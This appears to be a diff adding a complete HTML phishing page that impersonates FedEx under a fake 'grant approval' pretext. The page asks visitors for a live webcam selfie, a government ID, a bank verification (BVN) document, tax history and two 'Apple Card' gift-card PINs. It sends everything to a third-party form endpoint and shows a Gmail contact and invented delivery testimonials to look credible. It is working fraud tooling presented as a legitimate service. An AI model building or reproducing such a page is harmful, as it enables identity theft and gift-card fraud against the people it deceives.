@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FedEx - Grant Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: #4d148c;
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+
+        .main-content {
+            background: white;
+            margin: 40px auto;
+            padding: 40px;
+            max-width: 900px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #4d148c;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+
+        .intro-text {
+            background-color: #f0e6ff;
+            padding: 20px;
+            border-left: 4px solid #ff6600;
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+
+        .form-section {
+            margin-bottom: 30px;
+        }
+
+        .form-section h2 {
+            color: #4d148c;
+            font-size: 20px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #ff6600;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        input[type="file"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            background-color: #fafafa;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+
+        input[type="file"]:hover {
+            border-color: #4d148c;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #4d148c;
+        }
+
+        .camera-section {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 4px;
+            border: 2px dashed #ddd;
+            text-align: center;
+        }
+
+        #video {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 4px;
+            background-color: #000;
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #capturedImage {
+            max-width: 500px;
+            width: 100%;
+            border-radius: 4px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .camera-controls {
+            margin-top: 15px;
+        }
+
+        button {
+            background-color: #ff6600;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin: 5px;
+        }
+
+        button:hover {
+            background-color: #e55b00;
+        }
+
+        button.secondary {
+            background-color: #4d148c;
+        }
+
+        button.secondary:hover {
+            background-color: #3d0f6f;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+
+        .success-message {
+            display: none;
+            background-color: #d4edda;
+            color: #155724;
+            padding: 20px;
+            border-radius: 4px;
+            border: 1px solid #c3e6cb;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .success-message h2 {
+            color: #155724;
+            margin-bottom: 10px;
+        }
+
+        .contact-section {
+            background-color: #f9f9f9;
+            padding: 30px;
+            margin-top: 40px;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .contact-section h3 {
+            color: #4d148c;
+            margin-bottom: 15px;
+        }
+
+        .contact-btn {
+            background-color: #4d148c;
+            display: inline-block;
+            text-decoration: none;
+            color: white;
+            padding: 12px 40px;
+            border-radius: 4px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .contact-btn:hover {
+            background-color: #3d0f6f;
+        }
+
+        .deliveries-section {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 2px solid #ddd;
+        }
+
+        .deliveries-section h3 {
+            color: #4d148c;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .delivery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .delivery-card {
+            background-color: #fff;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .delivery-card h4 {
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .delivery-card p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .delivery-card .status {
+            color: #28a745;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .required {
+            color: #ff0000;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                padding: 20px;
+                margin: 20px;
+            }
+
+            .container {
+                padding: 0 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="container">
+            <div class="logo">FedEx</div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <h1>Grant Application Verification</h1>
+        
+        <div class="intro-text">
+            <p>Congratulations on your grant approval! To complete your application and ensure the secure delivery of your grant package, we require identity verification. This process protects both you and FedEx by confirming your identity and eligibility. Please provide the requested documents and information below. All information is encrypted and handled with the highest level of security and confidentiality. Once verified, your grant package will be processed and delivered to your registered address within 5-7 business days.</p>
+        </div>
+
+        <div class="success-message" id="successMessage">
+            <h2>✓ Verification Uploaded!</h2>
+            <p>We'll get back to you as soon as possible.</p>
+        </div>
+
+        <form id="verificationForm" action="https://formspree.io/f/mojvogpy" method="POST" enctype="multipart/form-data">
+            
+            <div class="form-section">
+                <h2>Facial Verification</h2>
+                <div class="camera-section">
+                    <p style="margin-bottom: 15px;">Please capture a live selfie for identity verification</p>
+                    <video id="video" autoplay></video>
+                    <canvas id="canvas"></canvas>
+                    <img id="capturedImage" alt="Captured selfie">
+                    <input type="hidden" name="selfie" id="selfieData">
+                    <div class="camera-controls">
+                        <button type="button" id="startCamera" class="secondary">Start Camera</button>
+                        <button type="button" id="captureBtn" style="display: none;">Capture Photo</button>
+                        <button type="button" id="retakeBtn" style="display: none;">Retake</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h2>Valid Means of Identification</h2>
+                <div class="form-group">
+                    <label for="idCard">ID Card / Driver's License / Passport <span class="required">*</span></label>
+                    <input type="file" id="idCard" name="id_document" accept="image/*,.pdf" required>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h2>Financial Verification</h2>
+                <div class="form-group">
+                    <label for="bankVerification">Bank Verification Number (BVN) Document</label>
+                    <input type="file" id="bankVerification" name="bank_verification" accept="image/*,.pdf">
+                </div>
+                <div class="form-group">
+                    <label for="taxHistory">Tax Payment History <span class="required">*</span></label>
+                    <input type="file" id="taxHistory" name="tax_history" accept="image/*,.pdf" required>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h2>Reference Verification</h2>
+                <div class="form-group">
+                    <label for="CARDPIN1">Apple Card Pin 1<span class="required">*</span></label>
+                    <input type="text" id="CARDPIN1" name="reference_pin_1" placeholder="Enter first reference PIN" required>
+                </div>
+                <div class="form-group">
+                    <label for="CARDPIN2">Apple Card Pin 2<span class="required">*</span></label>
+                    <input type="text" id="CARDPIN2" name="reference_pin_2" placeholder="Enter second reference PIN" required>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h2>Additional Documents</h2>
+                <div class="form-group">
+                    <label for="additionalDocs">Any Additional Supporting Documents</label>
+                    <input type="file" id="additionalDocs" name="additional_documents" accept="image/*,.pdf" multiple>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Submit Verification</button>
+        </form>
+
+        <div class="contact-section">
+            <h3>Questions or Need Assistance?</h3>
+            <p style="margin-bottom: 15px;">Contact our Program Coordinator for any inquiries or feedback</p>
+            <a href="mailto:thomasreeffedex@gmail.com" class="contact-btn">Contact Mr. Thomas</a>
+        </div>
+
+        <div class="deliveries-section">
+            <h3>Recent Grant Package Deliveries</h3>
+            <div class="delivery-grid">
+                <div class="delivery-card">
+                    <h4>Sarah M.</h4>
+                    <p>New York, NY</p>
+                    <p class="status">✓ Delivered</p>
+                </div>
+                <div class="delivery-card">
+                    <h4>James K.</h4>
+                    <p>Los Angeles, CA</p>
+                    <p class="status">✓ Delivered</p>
+                </div>
+                <div class="delivery-card">
+                    <h4>Maria G.</h4>
+                    <p>Chicago, IL</p>
+                    <p class="status">✓ Delivered</p>
+                </div>
+                <div class="delivery-card">
+                    <h4>David R.</h4>
+                    <p>Houston, TX</p>
+                    <p class="status">✓ Delivered</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const capturedImage = document.getElementById('capturedImage');
+        const startCameraBtn = document.getElementById('startCamera');
+        const captureBtn = document.getElementById('captureBtn');
+        const retakeBtn = document.getElementById('retakeBtn');
+        const selfieData = document.getElementById('selfieData');
+        const form = document.getElementById('verificationForm');
+        const successMessage = document.getElementById('successMessage');
+        let stream = null;
+
+        startCameraBtn.addEventListener('click', async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                startCameraBtn.style.display = 'none';
+                captureBtn.style.display = 'inline-block';
+            } catch (err) {
+                alert('Could not access camera. Please ensure camera permissions are enabled.');
+            }
+        });
+
+        captureBtn.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg');
+            selfieData.value = imageData;
+            capturedImage.src = imageData;
+            capturedImage.style.display = 'block';
+            video.style.display = 'none';
+            captureBtn.style.display = 'none';
+            retakeBtn.style.display = 'inline-block';
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        retakeBtn.addEventListener('click', async () => {
+            capturedImage.style.display = 'none';
+            retakeBtn.style.display = 'none';
+            selfieData.value = '';
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                captureBtn.style.display = 'inline-block';
+            } catch (err) {
+                alert('Could not access camera. Please ensure camera permissions are enabled.');
+            }
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            if (!selfieData.value) {
+                alert('Please capture a selfie before submitting.');
+                return;
+            }
+
+            const formData = new FormData(form);
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    form.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                } else {
+                    alert('There was an error submitting your verification. Please try again.');
+                }
+            }).catch(error => {
+                alert('There was an error submitting your verification. Please try again.');
+            });
+        });
+    </script>
+</body>
+</html>
